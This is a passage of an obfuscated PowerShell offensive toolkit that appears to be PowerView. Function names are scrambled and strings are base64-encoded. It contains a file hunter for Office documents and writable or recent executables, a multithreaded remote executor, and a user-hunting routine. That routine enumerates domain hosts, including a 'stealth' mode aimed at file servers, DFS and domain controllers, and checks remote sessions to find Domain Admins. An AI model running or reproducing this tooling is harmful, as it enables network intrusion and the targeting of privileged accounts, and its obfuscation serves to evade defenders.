        $SearchTerms = $SearchTerms | % { if($_ -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcACoALgAqAFwAKgAkAA==')))) {"*$($_)*"} else{$_} }
        if ($OfficeDocs) {
            $SearchTerms = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGQAbwBjAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGQAbwBjAHgA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHgAbABzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHgAbABzAHgA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHAAcAB0AA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHAAcAB0AHgA'))))
        }
        if($FreshEXEs) {
            $LastAccessTime = (Get-Date).AddDays(-7).ToString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBNAC8AZABkAC8AeQB5AHkAeQA='))))
            $SearchTerms = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGUAeABlAA==')))
        }
        if($UsePSDrive) {
            ${_/====\__/=\/====} = $Path.split('\')
            ${___/\/\_____/==\_} = ${_/====\__/=\/====}[0..(${_/====\__/=\/====}.length-2)] -join '\'
            ${_/\/\_/=\_/\_/\_/} = ${_/====\__/=\/====}[-1]
            ${/=\/\/==\/=\_/\/=} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBiAGMAZABlAGYAZwBoAGkAagBrAGwAbQBuAG8AcABxAHIAcwB0AHUAdgB3AHgAeQB6AA=='))).ToCharArray() | Get-Random -Count 7) -join ''
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHUAbgB0AGkAbgBnACAAcABhAHQAaAAgACcAJABQAGEAdABoACcAIAB1AHMAaQBuAGcAIABhACAAdABlAG0AcAAgAFAAUwBEAHIAaQB2AGUAIABhAHQAIAAkAHsALwA9AFwALwBcAC8APQA9AFwALwA9AFwAXwAvAFwALwA9AH0A')))
            try {
                $Null = ndr -Name ${/=\/\/==\/=\_/\/=} -PSProvider FileSystem -Root ${___/\/\_____/==\_} -ErrorAction Stop
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAbQBvAHUAbgB0AGkAbgBnACAAcABhAHQAaAAgACcAJABQAGEAdABoACcAIAA6ACAAJABfAA==')))
                return $Null
            }
            $Path = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAC8AXAAvAD0APQBcAC8APQBcAF8ALwBcAC8APQB9ADoAXAAkAHsAXwAvAFwALwBcAF8ALwA9AFwAXwAvAFwAXwAvAFwAXwAvAH0A')))
        }
    }
    process {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABTAGUAYQByAGMAaAAgAHAAYQB0AGgAIAAkAFAAYQB0AGgA')))
        function _/==\_/===\/\/\/== {
            [CmdletBinding()]param([String]$Path)
            try {
                ${_/=\__/===\__/==\} = [IO.FILE]::OpenWrite($Path)
                ${_/=\__/===\__/==\}.Close()
                $True
            }
            catch {
                Write-Verbose -Message $Error[0]
                $False
            }
        }
        ${_/\__/=\__/\_/\/\} =  @{
            'Path' = $Path
            'Recurse' = $True
            'Force' = $(-not $ExcludeHidden)
            'Include' = $SearchTerms
            'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
        }
        ls @_/\__/=\__/\_/\/\ | % {
            Write-Verbose $_
            if(!$ExcludeFolders -or !$_.PSIsContainer) {$_}
        } | % {
            if($LastAccessTime -or $LastWriteTime -or $CreationTime) {
                if($LastAccessTime -and ($_.LastAccessTime -gt $LastAccessTime)) {$_}
                elseif($LastWriteTime -and ($_.LastWriteTime -gt $LastWriteTime)) {$_}
                elseif($CreationTime -and ($_.CreationTime -gt $CreationTime)) {$_}
            }
            else {$_}
        } | % {
            if((-not $CheckWriteAccess) -or (_/==\_/===\/\/\/== -Path $_.FullName)) {$_}
        } | select FullName,@{Name=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA==')));Expression={(Get-Acl $_.FullName).Owner}},LastAccessTime,LastWriteTime,CreationTime,Length | % {
            if($OutFile) {______/\__/==\___/ -InputObject $_ -OutFile $OutFile}
            else {$_}
        }
    }
    end {
        if($UsePSDrive -and ${/=\/\/==\/=\_/\/=}) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB2AGkAbgBnACAAdABlAG0AcAAgAFAAUwBEAHIAaQB2AGUAIAAkAHsALwA9AFwALwBcAC8APQA9AFwALwA9AFwAXwAvAFwALwA9AH0A')))
            gdr -Name ${/=\/\/==\/=\_/\/=} -ErrorAction SilentlyContinue | rdr -Force
        }
    }
}
function ___/==\______/===\ {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,Mandatory=$True)]
        [String[]]
        $ComputerName,
        [Parameter(Position=1,Mandatory=$True)]
        [System.Management.Automation.ScriptBlock]
        ${_/=\__/\/\/==\/==\},
        [Parameter(Position=2)]
        [Hashtable]
        ${____/\/\_/\_/\/=\/},
        [Int]
        [ValidateRange(1,100)] 
        $Threads = 20,
        [Switch]
        ${_______/=\____/\/=}
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        Write-Verbose "[*] Total number of hosts: $($ComputerName.count)"
        ${/==\__/=\_/=\/==\} = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        ${/==\__/=\_/=\/==\}.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
        if(!${_______/=\____/\/=}) {
            ${_/=\___/\/=\/\/=\} = gv -Scope 2
            ${/=====\_/\_/\_/\/} = @("?",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQByAGcAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBvAGwAZQBGAGkAbABlAE4AYQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAaQBvAG4AQwBvAG4AdABlAHgAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBhAGwAcwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABPAE0ARQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHAAdQB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AE8AYgBqAGUAYwB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBBAGwAaQBhAHMAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBEAHIAaQB2AGUAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBFAHIAcgBvAHIAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBGAHUAbgBjAHQAaQBvAG4AQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBIAGkAcwB0AG8AcgB5AEMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBWAGEAcgBpAGEAYgBsAGUAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEkAbgB2AG8AYwBhAHQAaQBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB1AGwAbAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABJAEQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEIAbwB1AG4AZABQAGEAcgBhAG0AZQB0AGUAcgBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEMAbwBtAG0AYQBuAGQAUABhAHQAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEMAdQBsAHQAdQByAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEQAZQBmAGEAdQBsAHQAUABhAHIAYQBtAGUAdABlAHIAVgBhAGwAdQBlAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEgATwBNAEUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFMAYwByAGkAcAB0AFIAbwBvAHQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFUASQBDAHUAbAB0AHUAcgBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFYAZQByAHMAaQBvAG4AVABhAGIAbABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABXAEQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGUAbABsAEkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AG4AYwBoAHIAbwBuAGkAegBlAGQASABhAHMAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAZQA='))))
            ForEach(${/=\/====\/==\/==\} in ${_/=\___/\/=\/\/=\}) {
                if(${/=====\_/\_/\_/\/} -NotContains ${/=\/====\/==\/==\}.Name) {
                ${/==\__/=\_/=\/==\}.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList ${/=\/====\/==\/==\}.name,${/=\/====\/==\/==\}.Value,${/=\/====\/==\/==\}.description,${/=\/====\/==\/==\}.options,${/=\/====\/==\/==\}.attributes))
                }
            }
            ForEach(${/=\__/====\/==\/\} in (ls Function:)) {
                ${/==\__/=\_/=\/==\}.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList ${/=\__/====\/==\/\}.Name, ${/=\__/====\/==\/\}.Definition))
            }
        }
        ${_/==\____/=\_____} = [runspacefactory]::CreateRunspacePool(1, $Threads, ${/==\__/=\_/=\/==\}, $Host)
        ${_/==\____/=\_____}.Open()
        ${___/\__/======\__/} = $null
        ForEach (${_/\_/=\/=\__/====} in [PowerShell].GetMethods() | ? { $_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBlAGcAaQBuAEkAbgB2AG8AawBlAA=='))) }) {
            ${/==\_/\/==\_/\___} = ${_/\_/=\/=\__/====}.GetParameters()
            if ((${/==\_/\/==\_/\___}.Count -eq 2) -and ${/==\_/\/==\_/\___}[0].Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHAAdQB0AA=='))) -and ${/==\_/\/==\_/\___}[1].Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwB1AHQAcAB1AHQA')))) {
                ${___/\__/======\__/} = ${_/\_/=\/=\__/====}.MakeGenericMethod([Object], [Object])
                break
            }
        }
        ${/=\/\/===\/==\/\_} = @()
    }
    process {
        ForEach (${___/==\/\/==\/=\/} in $ComputerName) {
            if (${___/==\/\/==\/=\/} -ne '') {
                While ($(${_/==\____/=\_____}.GetAvailableRunspaces()) -le 0) {
                    sleep -MilliSeconds 500
                }
                ${_/===\__/\/\/\_/=} = [powershell]::create()
                ${_/===\__/\/\/\_/=}.runspacepool = ${_/==\____/=\_____}
                $Null = ${_/===\__/\/\/\_/=}.AddScript(${_/=\__/\/\/==\/==\}).AddParameter($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))), ${___/==\/\/==\/=\/})
                if(${____/\/\_/\_/\/=\/}) {
                    ForEach (${/==\_/\/\/==\_/==} in ${____/\/\_/\_/\/=\/}.GetEnumerator()) {
                        $Null = ${_/===\__/\/\/\_/=}.AddParameter(${/==\_/\/\/==\_/==}.Name, ${/==\_/\/\/==\_/==}.Value)
                    }
                }
                ${_/\_/=\/\/=\_/=\/} = New-Object Management.Automation.PSDataCollection[Object]
                ${/=\/\/===\/==\/\_} += @{
                    PS = ${_/===\__/\/\/\_/=}
                    Output = ${_/\_/=\/\/=\_/=\/}
                    Result = ${___/\__/======\__/}.Invoke(${_/===\__/\/\/\_/=}, @($null, [Management.Automation.PSDataCollection[Object]]${_/\_/=\/\/=\_/=\/}))
                }
            }
        }
    }
    end {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBhAGkAdABpAG4AZwAgAGYAbwByACAAdABoAHIAZQBhAGQAcwAgAHQAbwAgAGYAaQBuAGkAcwBoAC4ALgAuAA==')))
        Do {
            ForEach (${/====\/=\/\/=\_/\} in ${/=\/\/===\/==\/\_}) {
                ${/====\/=\/\/=\_/\}.Output.ReadAll()
            }
        } While ((${/=\/\/===\/==\/\_} | ? { ! $_.Result.IsCompleted }).Count -gt 0)
        ForEach (${/====\/=\/\/=\_/\} in ${/=\/\/===\/==\/\_}) {
            ${/====\/=\/\/=\_/\}.PS.Dispose()
        }
        ${_/==\____/=\_____}.Dispose()
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAIAB0AGgAcgBlAGEAZABzACAAYwBvAG0AcABsAGUAdABlAGQAIQA=')))
    }
}
function _/===\_/\_/=\__/\_ {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [Switch]
        $Unconstrained,
        [String]
        $GroupName = 'Domain Admins',
        [String]
        $TargetServer,
        [String]
        $UserName,
        [String]
        $UserFilter,
        [String]
        $UserADSpath,
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,
        [Switch]
        ${____/====\____/\_/},
        [Switch]
        ${__/\/=\____/\/\__/},
        [Switch]
        $CheckAccess,
        [Switch]
        $StopOnSuccess,
        [Switch]
        $NoPing,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $ShowAll,
        [Switch]
        $SearchForest,
        [Switch]
        ${_/=\_/\/\/\__/\/==},
        [String]
        [ValidateSet("DFS","DC","File","All")]
        $StealthSource ="All",
        [Switch]
        ${_____/==\__/\___/=},
        [Int]
        [ValidateRange(1,100)]
        $Threads,
        [UInt32]
        ${_/=\_/\____/\/=\__} = 0
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAHUAbgBuAGkAbgBnACAASQBuAHYAbwBrAGUALQBVAHMAZQByAEgAdQBuAHQAZQByACAAdwBpAHQAaAAgAGQAZQBsAGEAeQAgAG8AZgAgACQARABlAGwAYQB5AA==')))
        if($ComputerFile) {
            $ComputerName = gc -Path $ComputerFile
        }
        if(!$ComputerName) { 
            [Array]$ComputerName = @()
            if($Domain) {
                ${__/==\/=\_/=\/\__} = @($Domain)
            }
            elseif($SearchForest) {
                ${__/==\/=\_/=\/\__} = ___/\/\___/=\/==\/ | % { $_.Name }
            }
            else {
                ${__/==\/=\_/=\/\__} = @( (______/====\/=\__/).name )
            }
            if(${_/=\_/\/\/\__/\/==}) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGUAYQBsAHQAaAAgAG0AbwBkAGUAIQAgAEUAbgB1AG0AZQByAGEAdABpAG4AZwAgAGMAbwBtAG0AbwBuAGwAeQAgAHUAcwBlAGQAIABzAGUAcgB2AGUAcgBzAA==')))
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGUAYQBsAHQAaAAgAHMAbwB1AHIAYwBlADoAIAAkAFMAdABlAGEAbAB0AGgAUwBvAHUAcgBjAGUA')))
                ForEach ($Domain in ${__/==\/=\_/=\/\__}) {
                    if (($StealthSource -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQA=')))) -or ($StealthSource -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))))) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAEYAaQBsAGUAIABTAGUAcgB2AGUAcgBzAC4ALgAuAA==')))
                        $ComputerName += ____/\/=\/=\_/\_/= -Domain $Domain -DomainController $DomainController
                    }
                    if (($StealthSource -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABGAFMA')))) -or ($StealthSource -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))))) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAEQARgBTACAAUwBlAHIAdgBlAHIAcwAuAC4ALgA=')))
                        $ComputerName += __/=\_/\/\/\/\__/\ -Domain $Domain -DomainController $DomainController | % {$_.RemoteServerName}
                    }
                    if (($StealthSource -eq "DC") -or ($StealthSource -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))))) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAEQAbwBtAGEAaQBuACAAQwBvAG4AdAByAG8AbABsAGUAcgBzAC4ALgAuAA==')))
                        $ComputerName += __/=\____/=\/=\__/ -LDAP -Domain $Domain -DomainController $DomainController | % { $_.dnshostname}
                    }
                }
            }
            else {
                ForEach ($Domain in ${__/==\/=\_/=\/\__}) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAGgAbwBzAHQAcwA=')))
                    ${__/\_/\/===\/=\_/} = @{
                        'Domain' = $Domain
                        'DomainController' = $DomainController
                        'ADSpath' = $ADSpath
                        'Filter' = $ComputerFilter
                        'Unconstrained' = $Unconstrained
                    }
                    $ComputerName += _/=\___/=\_______/ @__/\_/\/===\/=\_/
                }
            }
            $ComputerName = $ComputerName | ? { $_ } | sort -Unique | sort { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
        if (${_/=\_/\____/\/=\__} -gt 0) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAG8AbABsAGkAbgBnACAAZgBvAHIAIAAkAHsAXwAvAD0AXABfAC8AXABfAF8AXwBfAC8AXAAvAD0AXABfAF8AfQAgAHMAZQBjAG8AbgBkAHMALgAgAEEAdQB0AG8AbQBhAHQAaQBjAGEAbABsAHkAIABlAG4AYQBiAGwAaQBuAGcAIAB0AGgAcgBlAGEAZABlAGQAIABtAG8AZABlAC4A')))
            if ($ComputerName.Count -gt 100) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG8AIABtAGEAbgB5ACAAaABvAHMAdABzACAAdABvACAAcABvAGwAbAAhACAAVAByAHkAIABmAGUAdwBlAHIAIAB0AGgAYQBuACAAMQAwADAALgA=')))
            }
            $Threads = $ComputerName.Count
        }
        ${_____/\/===\_____/} = @()
        ${/=\____/\/\_/=\/=} = ([Environment]::UserName).toLower()
        if($ShowAll -or ${_____/==\__/\___/=}) {
            ${_/\_/=\/\/=\_/===} = New-Object PSObject
            ${_/\_/=\/\/=\_/===} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) $Null
            ${_/\_/=\/\/=\_/===} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) '*'
            ${_____/\/===\_____/} = @(${_/\_/=\/\/=\_/===})
            if(${_____/==\__/\___/=}) {
                ${_/\/===\__/==\/\_} = _/=\/\/==\/==\_/\/ -__/\/==\_/\___/\/\ "krbtgt@$($Domain)" -_/==\/\/=\/=\_/=\_ Simple -___/=\/==\_/\__/== NT4
                ${_/===\_/==\_/=\_/} = ${_/\/===\__/==\/\_}.split("\")[0]
            }
        }
        elseif($TargetServer) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AGkAbgBnACAAdABhAHIAZwBlAHQAIABzAGUAcgB2AGUAcgAgACcAJABUAGEAcgBnAGUAdABTAGUAcgB2AGUAcgAnACAAZgBvAHIAIABsAG8AYwBhAGwAIAB1AHMAZQByAHMA')))
            ${_____/\/===\_____/} = __/\_/\/\_/\_/=\/\ $TargetServer -Recurse | ? {(-not $_.IsGroup) -and $_.IsDomain } | % {
                ${_/\_/=\/\/=\_/===} = New-Object PSObject
                ${_/\_/=\/\/=\_/===} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) ($_.AccountName).split("/")[0].toLower() 
                ${_/\_/=\/\/=\_/===} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) ($_.AccountName).split("/")[1].toLower() 
                ${_/\_/=\/\/=\_/===}
            }  | ? {$_}
        }
        elseif($UserName) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAaQBuAGcAIAB0AGEAcgBnAGUAdAAgAHUAcwBlAHIAIAAnACQAVQBzAGUAcgBOAGEAbQBlACcALgAuAC4A')))
            ${_/\_/=\/\/=\_/===} = New-Object PSObject
            if(${__/==\/=\_/=\/\__}) {
                ${_/\_/=\/\/=\_/===} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) ${__/==\/=\_/=\/\__}[0]
            }
            else {
                ${_/\_/=\/\/=\_/===} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) $Null
            }
            ${_/\_/=\/\/=\_/===} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) $UserName.ToLower()
            ${_____/\/===\_____/} = @(${_/\_/=\/\/=\_/===})
        }
        elseif($UserFile) {
            ${_____/\/===\_____/} = gc -Path $UserFile | % {
                ${_/\_/=\/\/=\_/===} = New-Object PSObject
                if(${__/==\/=\_/=\/\__}) {
                    ${_/\_/=\/\/=\_/===} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) ${__/==\/=\_/=\/\__}[0]
                }
                else {
                    ${_/\_/=\/\/=\_/===} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) $Null
                }
                ${_/\_/=\/\/=\_/===} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) $_
                ${_/\_/=\/\/=\_/===}
            }  | ? {$_}
        }
        elseif($UserADSpath -or $UserFilter -or ${____/====\____/\_/}) {
            ForEach ($Domain in ${__/==\/=\_/=\/\__}) {
                ${__/\_/\/===\/=\_/} = @{
                    'Domain' = $Domain
                    'DomainController' = $DomainController
                    'ADSpath' = $UserADSpath
                    'Filter' = $UserFilter
                    'AdminCount' = ${____/====\____/\_/}
                    'AllowDelegation' = ${__/\/=\____/\/\__/}
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAHUAcwBlAHIAcwA=')))
                ${_____/\/===\_____/} += __/=\_/\_/\/=\___/ @__/\_/\/===\/=\_/ | % {
                    ${_/\_/=\/\/=\_/===} = New-Object PSObject
                    ${_/\_/=\/\/=\_/===} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) $Domain
                    ${_/\_/=\/\/=\_/===} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) $_.samaccountname
                    ${_/\_/=\/\/=\_/===}
                }  | ? {$_}
            }
        }
        else {
            ForEach ($Domain in ${__/==\/=\_/=\/\__}) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAHUAcwBlAHIAcwAgAG8AZgAgAGcAcgBvAHUAcAAgACcAJABHAHIAbwB1AHAATgBhAG0AZQAnAA==')))
                ${_____/\/===\_____/} += _/\____/=\__/\/\/\ -GroupName $GroupName -Domain $Domain -DomainController $DomainController
            }
        }
        if (( (-not $ShowAll) -and (-not ${_____/==\__/\___/=}) ) -and ((!${_____/\/===\_____/}) -or (${_____/\/===\_____/}.Count -eq 0))) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAG8AIAB1AHMAZQByAHMAIABmAG8AdQBuAGQAIAB0AG8AIABzAGUAYQByAGMAaAAgAGYAbwByACEA')))
        }
        ${/\_____/\_/=\___/} = {
            param($ComputerName, $Ping, ${_____/\/===\_____/}, ${/=\____/\/\_/=\/=}, ${_/=\_/\/\/\__/\/==}, ${_/===\_/==\_/=\_/}, ${_/=\_/\____/\/=\__}, $Delay, $Jitter)
            ${/==\/\/\/=\/=\/==} = $True
            if($Ping) {
                ${/==\/\/\/=\/=\/==} = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if(${/==\/\/\/=\/=\/==}) {
                ${/=\/\___/\/===\__} = [System.Diagnostics.Stopwatch]::StartNew()
                ${_/=\/\_/\/\__/=\_} = New-Object System.Random
                Do {
                    if(!${_/===\_/==\_/=\_/}) {
                        ${_____/=\/==\_____} = __/==\/\_/\_/\/\_/ -ComputerName $ComputerName
                        ForEach (${_/=\___/=\_/\_/=\} in ${_____/=\/==\_____}) {
                            $UserName = ${_/=\___/=\_/\_/=\}.sesi10_username
                            ${/=\_/==\/===\_/=\} = ${_/=\___/=\_/\_/=\}.sesi10_cname
                            if(${/=\_/==\/===\_/=\} -and ${/=\_/==\/===\_/=\}.StartsWith("\\")) {
                                ${/=\_/==\/===\_/=\} = ${/=\_/==\/===\_/=\}.TrimStart("\")
                            }
                            if (($UserName) -and ($UserName.trim() -ne '') -and (!($UserName -match ${/=\____/\/\_/=\/=}))) {
                                ${_____/\/===\_____/} | ? {$UserName -like $_.MemberName} | % {
                                    ${/===\_/\/==\/\/=\} = @(_/=\/=\/=\_/=\/\_/ -ComputerName $ComputerName)[0].IPAddress
                                    ${_/=\_/==\_/\___/=} = New-Object PSObject
